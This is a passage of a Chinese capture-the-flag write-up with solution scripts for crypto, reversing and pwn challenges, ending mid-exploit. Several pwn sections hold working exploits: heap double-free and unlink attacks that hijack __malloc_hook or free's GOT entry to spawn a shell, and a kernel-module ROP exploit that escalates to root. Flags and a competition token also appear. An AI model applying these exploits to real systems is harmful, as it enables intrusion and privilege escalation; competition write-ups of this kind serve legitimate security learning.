c.sendlineafter('m=',hex(m).replace("L",""))

# small ciphertext
c.recvuntil('c=')
ct=int(c.recvline(),16)
m=1040065794283452835234332386718771782674284350646994660717501540629408351835476084209765388377794921102504315677880363816181535636530953053269277563867522157300904962146145717252718887520146030078204232460775
c.sendlineafter('m=',hex(m).replace("L",""))

def solve7(ct1,ct2): 
    p=172556869675477627998498055209836071784247150005171563227746896156122872188366409207785861691629822624239290434962401079375795926547190033528901472629460098214484911362406299395686098456884802352767604762878851834535300869832185076070001884294619607750730223241159644270340312192959960438465036924150469626273L
    q1=132351070426725062043554691080648210190952108157658335988407251230007075283172499240825840919032041018784725171991038079646749244434399109751200470150528052302049968282955114052567000382702788528085267361900807404612963675383296948833387201551997975485346080119293646868147213281855400241807127491238274887591L
    q2=142712204088308994057536283419724413794506016166476894328600394909477811164746138340181564452439035177705892406900049909054445185976447566687912817760888522575392942071446149843167125603211027327213321217046810724727383186248415705825602583825139689729004506328064673686005047611032077069064661986088327406489L
    e=0x10001
    n1=p*q1
    n2=p*q2
    phi=(p-1)*(q1-1)
    d1=inverse(e,phi)
    phi=(p-1)*(q2-1)
    d2=inverse(e,phi)
    return pow(ct1,d1,n1),pow(ct2,d2,n2)

# common factor
c.recvuntil('c1=')
ct1=int(c.recvline(),16)
c.recvuntil('c2=')
ct2=int(c.recvline(),16)
m1,m2=solve7(ct1,ct2)
c.sendlineafter('m1=',hex(m1).replace("L",""))
c.sendlineafter('m2=',hex(m2).replace("L",""))

# multi pubkey
n=0xace2aa1121d22a2153389fba0b5f3e24d8721f5e535ebf5486a74191790c4e3cdd0316b72388e7de8be78483e1f41ca5c930df434379db76ef02f0f8cd426348b62c0155cdf1d5190768f65ce23c60a4f2b16368188954342d282264e447353c62c10959fee475de08ec9873b84b5817fecb74899bedde29ef1220c78767f4de11ef1756404494ae1ce4af184cbc1c7c6de8e9cd16f814bca728e05bc56b090112f94fff686bf8122a3b199eb41080860fa0689ed7dbc8904184fb516b2bbf6b87a0a072a07b9a26b3cda1a13192c03e24dec8734378d10f992098fe88b526ce70876e2c7b7bd9e474307dc6864b4a8e36e28ce6d1b43e3ab5513baa6fa559ff
c.recvuntil('c1=')
c.recvuntil('c1=')
ct1=int(c.recvline(),16)
c.recvuntil('c2=')
ct2=int(c.recvline(),16)
ct2i=inverse(ct2,n)
f1=1917
f2=19966
m=pow(ct1,f1,n)*pow(ct2i,f2,n)%n
c.sendlineafter('m=',hex(m).replace("L",""))

def chinese_remainder(n, a):
    sum = 0
    prod = reduce(lambda a, b: a*b, n)
 
    for n_i, a_i in zip(n, a):
        p = prod / n_i
        sum += a_i * mul_inv(p, n_i) * p
    return sum % prod
 
 
def mul_inv(a, b):
    b0 = b
    x0, x1 = 0, 1
    if b == 1: return 1
    while a > 1:
        q = a / b
        a, b = b, a%b
        x0, x1 = x1 - q * x0, x0
    if x1 < 0: x1 += b0
    return x1

def solvecubic(c):
	l=1
	r=c-1
	while l<r:
		mid=(l+r)/2
		if pow(mid,3)<c:
			l=mid+1
		elif pow(mid,3)>c:
			r=mid-1
		else:
			l=mid
			r=mid
	assert pow(l,3)==c
	return l

# chinese remainder
c.recvuntil('c1=')
c.recvuntil('c1=')
ct1=int(c.recvline(),16)
c.recvuntil('c2=')
ct2=int(c.recvline(),16)
c.recvuntil('c3=')
ct3=int(c.recvline(),16)
n1=0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555
n2=0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867
n3=0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303
ct=chinese_remainder([n1,n2,n3], [ct1,ct2,ct3])
m=solvecubic(ct)
c.sendlineafter('m=',hex(m).replace("L",""))

c.interactive()
# flag{s1mp13_rs4_f0r_y0u_+_h4pp9_f0r_qwb}
```

## hide

典型逆向题要求输入密码，给了一个魔改过的upx，无法直接用upx解包出来，而且加了反调。

尝试在gdb中catch syscall ptrace，然后set $rax=0，成功进入后续逻辑，然后dump出相关代码。

里面的逻辑就比较简单，3次魔改过的tea加上异或，最终解密脚本如下：

```
from struct import pack,unpack

arr=[0x52,0xb8,0x13,0x7f,0x35,0x8c,0xf2,0x1b,0xf4,0x63,0x86,0xd2,0x73,0x4f,0x1e,0x31]
ct=map(chr,arr)

def rec8e50(ct):
    res=''
    for i in range(16):
        res+=chr(i^ord(ct[i]))
    return res

key=[1883844979,1165112144,2035430262,861484132]
DELTA=0x676E696C
rounds=8
    
def ul(v):
  return v & 0xFFFFFFFF

def rec8cc0(ct):
    res=''
    for j in range(2):
        v0=unpack('I',ct[8*j:8*j+4])[0]
        v1=unpack('I',ct[8*j+4:8*j+8])[0]
        sum = ul(DELTA * rounds)
        for i in range(rounds):
            v1 = ul(v1 - ((v0 << 4 ^ v0 >> 5) + v0 ^ sum + key[sum>>11 & 3]))
            sum = ul(sum - DELTA)
            v0 = ul(v0 - ((v1 << 4 ^ v1 >> 5) + v1 ^ sum + key[sum & 3]))
        res += pack('I',v0) + pack('I',v1)
    return res

def c8cc0(pt):
    res=''
    for j in range(2):
        v0=unpack('I',pt[8*j:8*j+4])[0]
        v1=unpack('I',pt[8*j+4:8*j+8])[0]
        sum = 0
        for i in range(rounds):
            v0 = ul(v0 + ((v1 << 4 ^ v1 >> 5) + v1 ^ sum + key[sum & 3]))
            sum = ul(sum + DELTA)
            v1 = ul(v1 + ((v0 << 4 ^ v0 >> 5) + v0 ^ sum + key[sum>>11 & 3]))
        res += pack('I',v0) + pack('I',v1)
    return res


for i in range(3):
    ct = rec8e50(ct)
    ct = rec8cc0(ct)

print ct
# qwb{f1Nd_TH3HldeC0dE}
```

## obf

同样输入密码并验证，程序fork之后在子程序中有大量的int 3，在父进程ptrace上去之后每次接受int 3再修改rip继续执行，由于各种跳转逻辑均位于父进程中，而代码在子进程里，导致整个执行过程比较复杂。

静态跟一段时间后，发现类似ollvm，没有太好的办法于是人工看，附上草稿如下：

```
v18=a1
for v44 in range(4):
  for v48 in range(4):
    a4c[v48]=v18[v48*4+v44]
  for v48 in range(4): #t40104b
    if (signed)a4c[v48]<0: # t40099b
#t400a81
v4d=(a4c[v48]*2)^0x1b
    else:
#t4010fd
v4d=a4c[v48]*2

#t400a1d
r8=(v48+1)%4
if (signed)a4c[r8]<0:
  # t400cf0
tmp=(v48+1)%4
v180=a4c[tmp]
ecx=a4c[tmp]*2
edx=ecx^0x1b
v4e=edx^v180

else:
  # t400c4f
tmp=(v48+1)%4
v188=a4c[tmp]
v4e=v188^(v188*2)

#t4011a7
r8=(v48+2)%4
v4f=a4c[r8]
r8=(v48+3)%4
v50=a4c[r8]
r11d=v4f^v50
r9=r11d^v4e^v4d
v50=r9
a1[v48*4+v44]=v50


  
for v44 in range(4):
  for v48 in range(4): #t400d9c
    #t401315
    a30[v44*4+v48]=a1[v48*4+v44]

for v44 in range(16): #t400937
  #t401116
  a30[i]^=i

v54=1
mov     dword ptr [rbp-40h], 2F9F66CAh
mov     dword ptr [rbp-3Ch], 7E3B2547h
mov     dword ptr [rbp-38h], 0B6A73B4Eh
mov     dword ptr [rbp-34h], 6478E982h
mov     dword ptr [rbp-44h], 0

for v44 in range(16):
  #t4009bb
  if a30[v44]!=a40[v44]:
    v54=0

return v54
```
整体逻辑比较复杂，但由于每次只根据4byte进行变换，直接暴力即可复原，相关脚本如下：
```
>>> ct=pack('I',0x2F9F66CA)+pack('I',0x7E3B2547)+pack('I',0x0B6A73B4E)+pack('I',0x6478E982)
>>> ct2=''
>>> for i in range(16):
	ct2+=chr(ord(ct[i])^i)

>>> ct3=''
>>> ct3=[0]*16
>>> for i in range(4):
	for j in range(4):
		ct3[j*4+i]=ord(ct2[i*4+j])

def solve(a,b,c,d):
	for i in range(32,128):
		for j in range(32,128):
			for k in range(32,128):
				l=a^ub(i)^ub(j)^j^k
				if ub(j)^ub(k)^k^l^i==b and ub(k)^ub(l)^l^i^j==c and ub(l)^ub(i)^i^j^k==d:
					return i,j,k,l
	return 'ERROR'

>>> pt=[0]*16
>>> for i in range(4):
	pt[i],pt[i+4],pt[i+8],pt[i+12]=solve(ct3[i],ct3[i+4],ct3[i+8],ct3[i+12])

	
>>> ''.join(map(chr,pt))
'0bFuCat3_Rec0v3R'
>>> 

flag{tRy_T0_d3ObFvcAt3_1T}
```

最终连服务器交上密码后即可获得flag


## re

xtensa架构，在github上搜了一个python写的proc模块，就能load进来了，中途发现某些地方无法反汇编，该部分就使用radare2看了，草稿如下：

```
f0=sum
if 0.5<f0 and f0<=1.5
  res=3
elif 1.5<f0 and f0<=2.5:
  res=2
elif 2.5<f0 and f0<=3.5:
  res=1
elif f0>3.5:
  res=0
else
  res=4

qwb5
if a0>47.5 and a0<57.5
  return a0-48
elif a0>96.5 and a0<122.5
  return a0-97+10
elif a0>64.5 and a0<...
  return a0-65+10
else
  return 0

qwb1
a[0]*16+a[2]==87
a[1]*16+a[3]==113

qwb2
a[5]*16+a[7]=89
a[4]*16+a[6]=80

qwb3
a[11]*16+a[8]=53
a[10]*16+a[9]=53

qwb4
a[14]*16+a[12]=107
a[15]*16+a[13]=57
```
其中用到了大量浮点运算，通过python的unpack可以还原出相关浮点数值。

最终flag结果为QWB{577155095533b963}



## Pig
一个很明显的double free，修改malloc hook的地址为gadget地址，最后再次通过double free的error触发malloc

	#! /usr/bin/env python
	# -*- coding: utf-8 -*-
	
	from pwn import *
	context.log_level="debug"
	pwn_file="./raisepig"
	elf=ELF(pwn_file)
	os.environ["LD_LIBRARY_PATH"]="."
	libc_address=0
	#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
	libc=ELF("./libc.so.6")
	if len(sys.argv)==1:
	    conn=process(pwn_file)
	    pid=conn.pid
	else:
	    conn=remote("39.107.32.132",9999)
	    pid=0
	
	def debug():
	    log.debug("libc address 0x%x"%libc_address)
	    log.debug("process pid:%d"%pid)
	    pause()
	
	def add(namelen,name,t):
	    conn.sendlineafter("Your choice :","1")
	    conn.sendlineafter("Length of the name :",str(namelen))
	    conn.sendafter("The name of pig :",name)
	    conn.sendlineafter("The type of the pig :",t)
	
	def show(index):
	    conn.sendlineafter("Your choice :","2")
	    conn.recvuntil("Name[%d] :"%index)
	    name=conn.recvline()
	    conn.recvuntil("Type[%d] :"%index)
	    t=conn.recvline()
	    return name,t
	
	def eat(index):
	    conn.sendlineafter("Your choice :","3")
	    conn.sendlineafter("Which pig do you want to eat:",str(index))
	
	def clean():
	    conn.sendlineafter("Your choice :","4")
	
	add(0x100,"a","t")#0
	add(0x10,"a","t")#1
	eat(0)
	add(0xd0,"a"*8,"t")#2
	name,t=show(2)
	#libc_address=u64(name[8:14]+"\x00\x00")-0x3c4b78
	libc_address=u64(name[8:14]+"\x00\x00")-3951480
	add(0x60,"a","t")#3
	add(0x60,"a","t")#4
	#add(0x10000,"a"*0x10000,"t")#5
	eat(3)
	eat(4)
	eat(3)
	add(0x60,p64(libc.symbols["__malloc_hook"]+libc_address-19),"t")
	add(0x60,"a","t")
	add(0x60,"a","t")
	#gadget=[0xf1147,0xf02a4]
	gadget=[0xf1117,0xf0274,0x4526a,0x45216]
	jump=gadget[2]+libc_address
	debug()
	add(0x60,"a"*3+p64(jump),"t")
	eat(8)
	conn.interactive()


## Silent
通过double free ，利用bss上的stderr的0x7f字节伪造一个chunk，申请出chunk后覆盖指针数组，将free的got表改为system的地址，通过free调用system。  
	
	#! /usr/bin/env python
	# -*- coding: utf-8 -*-
	
	from pwn import *
	context.log_level="debug"
	pwn_file="./silent"
	elf=ELF(pwn_file)
	
	if len(sys.argv)==1:
	    conn=process(pwn_file)
	    pid=conn.pid
	else:
	    conn=remote("39.107.32.132",10000)
	    pid=0
	
	def debug():
	    log.debug("process pid:%d"%pid)
	    pause()
	
	def add(size,content):
	    conn.sendline("1")
	    conn.send("\n")
	    conn.send(str(size))
	    conn.send(content)
	    conn.send("\n")
	
	def edit(index,content,junk):
	    conn.sendline("3")
	    conn.send("\n")
	    conn.sendline(str(index))
	    conn.send(content)
	    sleep(0.1)
	    conn.send(junk)
	
	def dele(index):
	    conn.sendline("2")
	    conn.send("\n")
	    conn.send(str(index))
	    conn.send("\n")
	
	conn.recv()
	add(0x60,"a")#1
	add(0x60,"a")#2
	add(0x60,"a")#3
	dele(0)
	dele(1)
	dele(0)
	add(0x60,"a")
	edit(0,p64(0x60209d),"1\n")
	add(0x60,"a")
	add(0x60,"a")
	add(0x60,"//bin/sh")
	add(0x60,"a"*0x14+p64(elf.got["free"])+p64(0))
	edit(0,p64(elf.symbols["system"]),"")
	conn.sendline("2")
	conn.sendline("3")
	conn.send("h")
	conn.interactive()

## Silent2
由于这次对size的大小有所限制，利用unsortbin，伪造chunk，通过unlink修改指针数组，将free的got表内容改为system地址。

	#! /usr/bin/env python
	# -*- coding: utf-8 -*-
	
	from pwn import *
	context.log_level="debug"
	#os.environ["LD_LIBRARY_PATH"]="/dbg64/lib"
	pwn_file="./silent2"
	elf=ELF(pwn_file)
	
	if len(sys.argv)==1:
	    conn=process(pwn_file)
	    pid=conn.pid
	else:
	    conn=remote("39.107.32.132",10001)
	#    conn=remote("cc",4444)
	    pid=0
	
	def debug():
	    log.debug("process pid:%d"%pid)
	    pause()
	
	def add(size,content):
	    conn.sendline("1")
	    sleep(0.1)
	    conn.send("\n")
	    sleep(0.1)
	    conn.send(str(size))
	    sleep(0.1)
	    conn.send("\n")
	    sleep(0.1)
	    conn.send(content)
	    sleep(0.1)
	
	def edit(index,content,junk):
	    conn.sendline("3")
	    sleep(0.1)
	    conn.send("\n")
	    sleep(0.1)
	    conn.send(str(index))
	    sleep(0.1)
	    conn.send("\n")
	    sleep(0.1)
	    conn.send(content)
	    sleep(0.1)
	    conn.send(junk)
	    sleep(0.1)
	
	def dele(index):
	    conn.sendline("2")
	    sleep(0.1)
	    conn.send("\n")
	    sleep(0.1)
	    conn.send(str(index))
	    sleep(0.1)
	    conn.send("\n")
	
	conn.recv()
	add(0x100,"a"*0x20)#0
	add(0x100,"a"*0x20)#1
	add(0x100,"a"*0x20)#2
	add(0x100,"a"*0x20)#3
	add(0x100,"a"*0x20)#4
	dele(2)
	dele(3)
	dele(4)
	add(0x200,"a"*0x20)#5
	add(0x200,"a"*0x20)#6
	add(0x10,"a")#7
	dele(5)
	dele(6)
	f={
	    0:"/bin/sh\x00",
	    0x110:p64(0),
	    0x118:p64(0x101),
	    0x120:p64(0x6020d0-0x10),
	    0x128:p64(0x6020d0-0x8),
	    0x210:p64(0x100),
	    0x218:p64(0x110),
	    0x320:p64(0),
	    0x328:p64(0x21),
	    0x340:p64(0),
	    0x348:p64(0x21),
	}
	payload=fit(f,filler="a")
	add(0x410,payload)
	dele(4)
	edit(3,p64(elf.got["free"])[:4],"a")
	edit(0,p64(elf.symbols["system"])[:6],"a")
	dele(8)
	conn.sendline("ls")
	conn.interactive()



## xx_fw_re
先想办法dump固件和调试器，通过open read write，读取`/proc/self/`下的东西。脚本见<https://gist.github.com/f55ae55d901d34adce56ecd0939368c2>
根据固件和调试器，把一些mod文件dump出来。之后开始分析。
分析dump下来的bios，发现load 了三个flag_re mod，并做了变换，并且执行。使用如下脚本，得到了对应的三段指令：
```
/*
 * main.c
 * Copyright (C) 2018 hzshang <hzshang15@gmail.com>
 *
 * Distributed under terms of the MIT license.
 */
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
void *fun_ptr;
void *rdi;
void *rsi;
void *rdx;

int main() {

    int length=0x10000;

    fun_ptr = malloc(length);
    int code_fd=open("mycode",O_RDONLY);
    while(read(code_fd,fun_ptr,length) > 0);

    int flag_fd=open("flag_re1.mod",O_RDONLY);
    rdi=malloc(length);
    while(read(flag_fd,rdi,length) > 0);
    
    int box_fd=open("rp_box.mod",O_RDONLY);
    rdx=malloc(length);
    while(read(box_fd,rdx,length) > 0);
    
    rsi=malloc(length);
    
    asm(
        "xor %%rax,%%rax\n\t"
        "xor %%rbx,%%rbx\n\t"
        "xor %%rcx,%%rcx\n\t"
        "xor %%rdx,%%rdx\n\t"
        "xor %%rsi,%%rsi\n\t"
        "xor %%rdi,%%rdi\n\t"
        "xor %%r8,%%r8\n\t"
        "xor %%r9,%%r9\n\t"
        "xor %%r10,%%r10\n\t"
        "xor %%r11,%%r11\n\t"
        "xor %%r12,%%r12\n\t"
        "xor %%r13,%%r13\n\t"
        "xor %%r14,%%r14\n\t"
        "xor %%r15,%%r15\n\t"
        "mov %1,%%rdi\n\t"
        "mov %2,%%rsi\n\t"
        "mov %3,%%rdx\n\t"
        "call *%0\n\t"
        "nop\n\t"
        "nop\n\t"
        "hlt\n\t"
        ::"m"(fun_ptr),"m"(rdi),"m"(rsi),"m"(rdx));
        
    return 0;
}

```
第一段指令是hex decode，得到flag{xx
第三段指令得到 60r1ng}
第二段指令比较复杂，使用输入的一部分做明文，一部分做密钥，做类似于tea加密，得到的结果符合一个方程组。猜测明文中有下划线使用脚本爆破：
```
from struct import pack,unpack

DELTA=0xBADF00D
rounds=32

key=[0,0,0,0]

def ul(v):
  return v & 0xFFFFFFFF

def tea(pt):
    res=''
    v0=unpack('I',pt[:4])[0]
    v1=unpack('I',pt[4:8])[0]
    sum = 0
    for i in range(rounds):
        sum = ul(sum + DELTA)
        v0 = ul(v0+((v1+sum)^(16*v1+key[0])^((v1>>5)+key[1])))
        
        v1 = ul(v1+((v0+sum)^(16*v0+key[2])^((v0>>5)+key[3])))
    res += pack('I',v0) + pack('I',v1)
    print sum
    return res

def retea(ct):
    res=''
    v0=unpack('I',ct[:4])[0]
    v1=unpack('I',ct[4:8])[0]
    sum = ul(DELTA * (rounds))
    #print sum
    for i in range(rounds):
       
        v1 = ul(v1-((v0+sum)^(16*v0+key[2])^((v0>>5)+key[3])))
        v0 = ul(v0-((v1+sum)^(16*v1+key[0])^((v1>>5)+key[1])))
        sum = ul(sum - DELTA)
        
    res += pack('I',v0) + pack('I',v1)
    return res

#for i in range(128):
#    for j in range(128):
#        key[0]=j*256+i

    
ct='\xff\xe5\xf1K\xef\xb9\xe03'

for i in range(128):
    for j in range(128):
        key[0]=j*256+i
        pt=retea(ct)
        if "th15_t34" in pt:
            print repr(pt)
            print repr(key)
            print chr(i)
            print chr(j)
       
        if "_" in pt:
            print pt
```
从结果中选取全是可见字符的解，得到th15_t34_1s_2

最后组合并尝试得到flag

flag:flag{xx_th15_t34_1s_2_60r1ng}

## 问卷调查

提交问卷即可

flag{强网杯强国梦}


## core

/tmp/kallsyms 可以得知 kernel address，过 KASLR

把 offset 改大，`core_read` 可以 leak stack canary

`core_write` 到全局 buf 后，`core_copy_func` 可以 stack overflow，ROP，`commit_creds(prepare_kernel_cred(0))` 提权后，swapgs & iretq get shell

exploit.py:

```python
#!/usr/bin/env python
# coding:utf-8

# apt install musl-tools
# ./exploit.py MODE=remote
# QWB{Simp1e_Kern3l_p0wn}

from ctf import *

exe = ['sh', './start.sh']
context.arch = 'amd64'
# context.log_level = 'DEBUG'
mode = args['MODE'].lower()
os.environ['LD_LIBRARY_PATH'] = os.curdir


def exploit():
    os.system('musl-gcc -Os -static -o exploit exploit.c')

    if mode == 'debug':
        io = debug(exe)
        io.b([])
        io.r()
    elif mode == 'remote':
        io = remote('117.50.2.191', 9999)
        io.sendlineafter('Token:', 'icqde8dabd22289554a0a90dd871d6b3')

    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(exe)

    # io.sendlineafter('/ $ ', 'stty -echo')
    io.sendlineafter('/ $ ', 'cat << EOF > exp.b64')
    io.sendline(read('./exploit').encode('base64'))
    io.sendline('EOF')
    io.sendlineafter('$ ', 'base64 -d exp.b64 > exp')
    io.sendlineafter('$ ', 'chmod +x exp')
    # io.sendlineafter('$ ', 'stty +echo')

    io.sendlineafter('$ ', './exp')

    if mode == 'debug':
        io.interrupt()
        io.sendlines('''
        #'''.strip().split('\n'))

    io.interactive()


if __name__ == '__main__':
    exploit()
```

exploit.c

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pty.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

void set_affinity(int which_cpu) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

unsigned long user_cs, user_ss, user_rflags;

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void show_buf(char *buf, int size) {
    fprintf(stderr, "(%d) length buf : ", size);
    for (int i = 0; i < size; i++) {
        fprintf(stderr, "%02x", (unsigned char)buf[i]);
    }
    fprintf(stderr, "\n");
}

int core_fd;

void init_core() {
    core_fd = open("/proc/core", O_RDWR);
    if (core_fd < 0) {
        perror("open");
        exit(1);
    }
}

void core_read(char *buf) {
    if (ioctl(core_fd, 0x6677889B, buf)) {
        perror("core read");
        exit(1);
    }
}

void core_modify_offset(int offset) {
    if (ioctl(core_fd, 0x6677889C, offset) < 0) {
        perror("modify offset");
        exit(1);
    }
}

void core_write(char *buf, size_t size) {
    if (write(core_fd, buf, size) < 0) {
        perror("write");
        exit(1);
    }
}

void core_copy_func(signed long size) {
    if (ioctl(core_fd, 0x6677889A, size) < 0) {
        perror("copy func");
        exit(1);
    }
}

unsigned long kernel_text_base;

unsigned char unhex(unsigned char c) {
    if ((c >= '0') && (c <= '9')) {
        return c - '0';
    } else if ((c >= 'a') && (c <= 'f')) {
        return c - 'a' + 10;
    } else if ((c >= 'A') && (c <= 'F')) {
        return c - 'A' + 10;
    }
    perror("unhex failed");
}

unsigned long get_kernel_base() {
    FILE *fp = fopen("/tmp/kallsyms", "r");
    // char *line;
    // size_t len;
    // getline(&line, &len, fp);
    // getline(&line, &len, fp);
    char l[0x100];
    fscanf(fp, "%s %s %s\n", l, l, l);
    fscanf(fp, "%s %s %s\n", l, l, l);
    char buf[0x10];
    fread(buf, 1, 0x10, fp);
    char res[0x8];
    for (int i = 0; i < 16; i += 2) {
        int target = 7 - (i >> 1);
        res[target] = unhex(buf[i]) * 16 + unhex(buf[i + 1]);
    }
    return *(unsigned long *)res;
}

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = 0;
_prepare_kernel_cred prepare_kernel_cred = 0;

void get_root_payload(void) {
    commit_creds(prepare_kernel_cred(0));
}

void get_shell() {
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

int main(void) {
    save_state();
    set_affinity(0);

    init_core();

    char buf[0x100];
    core_modify_offset(0x40);
    core_read(buf);
    show_buf(buf, 0x40);
    unsigned long core_base = *(unsigned long *)(buf + 0x10) - 0x19B;
    fprintf(stderr, "core base: %#lx\n", core_base);

    unsigned long kernel_base = get_kernel_base();
    fprintf(stderr, "kernel base: %#lx\n", kernel_base);
    commit_creds = kernel_base + 0x9c8e0;
    prepare_kernel_cred = kernel_base + 0x9cce0;

    // unsigned long lower_addr = xchgeaxesp & 0xFFFFFFFF;
    unsigned long lower_addr = 0x30000000;
    unsigned long base = lower_addr & ~0xFFF;
    if (mmap(base, 0x100000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base) {
        perror("mmap");
        exit(1);
    }
    unsigned long swapgs = kernel_base + 0xa012da;
    unsigned long iretq = kernel_base + 0xa00987;
    unsigned long rop_chain[] = {
        // poprdiret,
        // 0x6f0, // cr4 with smep disabled
        // native_write_cr4,
        get_root_payload,
        swapgs,
        // 0, // dummy
        // 0xdead,
        0x00000246,
        iretq,
        get_shell,
        user_cs, user_rflags, base + 0x100000, user_ss};
    show_buf(rop_chain, sizeof(rop_chain));

    *(unsigned long *)(buf + 0x40) = *(unsigned long *)buf;
    // *(unsigned long *)(buf + 0x50) = core_base + 0xf6;
    // *(unsigned long *)(buf + 0x58) = 0xdead;
    memcpy(buf + 0x50, rop_chain, sizeof(rop_chain));

    core_write(buf, sizeof(buf));
    core_copy_func((signed int)0xffff0100);

    return 0;
}
```

## opm

（感觉不是正解，调试到哭。。。

漏洞是 gets 两次栈溢出，有 stack cookie 不能 ROP，可以覆盖 Role 指针。

由于保护全开，且 gets 末尾一定会产生 `\0`，于是尝试覆盖 Role 低两个 byte，第二个 byte 一定会是 `\0`，于是通过布局，可以控制概率为 1/16 碰撞。

通过一通乱改，将某个 Role 的函数指针从 show 改成 add，通过 list 功能使得可以无限 add，从而拿 shell。
其中需要注意的是中间会有一个 Role 函数指针需要人工控制，而我们最开始没有 leak，故而只能选择使用 vsyscall。

具体见代码，实在太复杂，描述困难。。。

```python
#!/usr/bin/env python
# coding:utf-8

# ./exploit.py NOPTRACE ASLR LIBC=libc.so MODE=remote;
# QWB{You_know_y0u_4r3_hack3333r}

from ctf import *

binary = './opm'
context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
if not args['ASLR']:
    context.aslr = False
mode = args['MODE'].lower()
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = os.path.abspath(libc)
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
info('libc: %s', libc)
libc = ELF(libc)


def exploit():
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
        # io = debug(binary)
        # io.c()
        # io.interactive()
    elif mode == 'remote':
        io = remote('39.107.33.43', 13572)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def add_role(name, punch=0):
        io.sendlineafter('(A)dd', 'A')
        io.sendline(name)
        io.sendline(punch)

    def add_role_vul(name, punch=0):
        io.sendline(name)
        io.sendline(punch)

    for i in xrange(5):
        add_role(cyclic(126))  # + p8(0x80))
    add_role(cyclic(0x10))  #, cyclic(128) + p8(0x80))
    add_role('A' * 5 + p64(0xffffffffff6008ff))
    add_role('\0' * 0x10)

    # if mode == 'debug':
    #     io.interrupt()
    #     io.b(0x0000555555554C61)
    #     io.c()
    # if mode == 'debug':

    # add_role(cyclic(0x10), '0\0'.ljust(128) + '\n')
    gdb.attach(
        io,
        gdbscript='''
        b *0x0000555555554C61
        b *0x0000555555554BCE
        c
    #''')
    # add_role(cyclic(0x10), ljust('{:d}'.format(0x62000000), 128) + p8(0x5))
    payload = ljust('{:d}'.format(0x62000000), 128) + p8(0x65)
    add_role(payload, payload)
    # set *(char *)($rbp - 0x1a0 + 128 + 1) = 0x90
    # dq 0x00005555557560E0 10

    add_role('\0'.ljust(128) + p8(0x4e), cyclic(128) + p8(0x80))

    io.sendlineafter('(A)dd', 'S')
    add_role_vul('\0'.ljust(128) + p8(0x45))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendlineafter('(A)dd', 'S')
    add_role_vul('\0'.ljust(128) + p8(0x14))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendlineafter('(A)dd', 'S')
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0x3a000055), 128) + p8(0x1d))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.recvline_endswith('ff600800 punches')
    io.recvuntil('<')
    leaked = io.recvuntil('>', drop=True)
    a_heap_ptr = unpack('\x00\x00' + leaked, 'all')  # 000055afc5580000
